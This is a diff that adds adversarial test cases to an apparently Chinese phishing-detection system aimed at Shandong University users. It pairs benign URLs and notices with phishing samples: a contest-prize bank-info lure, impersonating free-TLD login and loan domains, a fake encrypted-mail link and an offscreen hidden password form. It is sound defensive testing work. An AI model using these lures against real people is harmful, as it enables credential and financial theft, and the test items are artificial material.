+- id: A20
+  label: normal
+  input_type: url
+  input_text: https://mail.sdu.edu.cn/
+  expected_level: low
+  forbidden_rule_ids:
+  - DOMAIN_SIMILAR_TO_OFFICIAL
+  - URL_AT_SYMBOL
+  - URL_NON_HTTPS
+  description: 对抗：学校邮箱登录（官方）
+- id: A21
+  label: phishing
+  input_type: email
+  input_text: 您参加的 2025 年创新创业大赛获奖，奖金 10000 元！请访问 https://cxcy-contest.com/reward 填写银行信息领取。
+  context:
+    sender: award@cxcy-contest.com
+  expected_level: low
+  required_rule_ids:
+  - REWARD_OR_REFUND_BAIT
+  forbidden_rule_ids: []
+  description: 对抗：比赛奖金骗局
+- id: A22
+  label: normal
+  input_type: text
+  input_text: 这本教材的 ISBN 是 978-7-04-045798-0，出版社是高等教育出版社。
+  expected_level: low
+  forbidden_rule_ids:
+  - URGENT_VERIFY_WORDING
+  - ACCOUNT_DISABLE_THREAT
+  - SECURITY_UPGRADE_WORDING
+  - REWARD_OR_REFUND_BAIT
+  description: 对抗：包含数字和出版社名称的无害文本
+- id: A23
+  label: phishing
+  input_type: email
+  input_text: 【部门通知】您的个人资料需要更新，请点击 https://sdu-login-update.ml/auth 进行验证。
+  context:
+    sender: admin@sdu-login-update.ml
+  expected_level: medium
+  required_rule_ids:
+  - DOMAIN_KEYWORD_IMPERSONATION
+  forbidden_rule_ids: []
+  description: 对抗：免费 TLD(.ml) 域名含品牌+登录词
+- id: A24
+  label: normal
+  input_type: email
+  input_text: 学术不端检测系统提交确认：您的论文已提交至 https://check.cnki.net/ 查重，检测结果将在 3 个工作日内反馈。
+  context:
+    sender: gradschool@sdu.edu.cn
+  expected_level: low
+  forbidden_rule_ids:
+  - EMAIL_SENDER_IMPERSONATION
+  description: 对抗：包含外部链接（知网）的官方邮件
+- id: A25
+  label: phishing
+  input_type: html
+  input_text: <html><body><div style='position:absolute;left:-9999px'><form><input type='password' name='hidden_pwd'></form></div><p>欢迎</p></body></html>
+  expected_level: low
+  required_rule_ids:
+  - FORM_COLLECTS_SECRET
+  forbidden_rule_ids: []
+  description: 对抗：CSS 隐藏表单（非 display:none）
+- id: A26
+  label: normal
+  input_type: url
+  input_text: https://sso.sdu.edu.cn/sso/login?service=https://my.sdu.edu.cn
+  expected_level: low
+  forbidden_rule_ids:
+  - DOMAIN_SIMILAR_TO_OFFICIAL
+  - URL_AT_SYMBOL
+  description: 对抗：SSO 登录（带 service 参数，合法）
+- id: A27
+  label: phishing
+  input_type: email
+  input_text: 您有一封来自'山东大学信息技术中心'的加密邮件，请点击链接查看：https://secure-message.xyz/sdu/read?msg=encrypted
+  context:
+    sender: secure@secure-message.xyz
+  expected_level: medium
+  required_rule_ids:
+  - EMAIL_SENDER_IMPERSONATION
+  forbidden_rule_ids: []
+  description: 对抗：加密邮件幌子 + 可疑域名
+- id: A28
+  label: normal
+  input_type: email
+  input_text: 同学您好，校园卡遗失招领：请到一卡通服务中心取回您的校园卡。
+  context:
+    sender: lostcard@sdu.edu.cn
+  expected_level: low
+  forbidden_rule_ids:
+  - EMAIL_SENDER_IMPERSONATION
+  description: 对抗：包含'领取'但非钓鱼的失物招领
+- id: A29
+  label: phishing
+  input_type: email
+  input_text: 【学生事务中心】关于助学贷款续贷的通知：请扫描附件中的二维码填写续贷申请。
+  context:
+    sender: loan@sdu-loan.ga
+    qr_urls:
+    - https://loan-phish.com/apply
+  expected_level: low
+  required_rule_ids:
+  - QR_CODE_EXTERNAL_URL
+  forbidden_rule_ids: []
+  description: 对抗：助学贷款主题 + QR + 免费 TLD(.ga)
+- id: A30
+  label: normal
+  input_type: text
+  input_text: 教学楼的 WiFi 密码是 SDU-WiFi-2025。
+  expected_level: low
+  forbidden_rule_ids:
+  - CREDENTIAL_REQUEST_TEXT
+  - URGENT_VERIFY_WORDING
+  description: 对抗：包含'密码'一词但不危险的日常文本
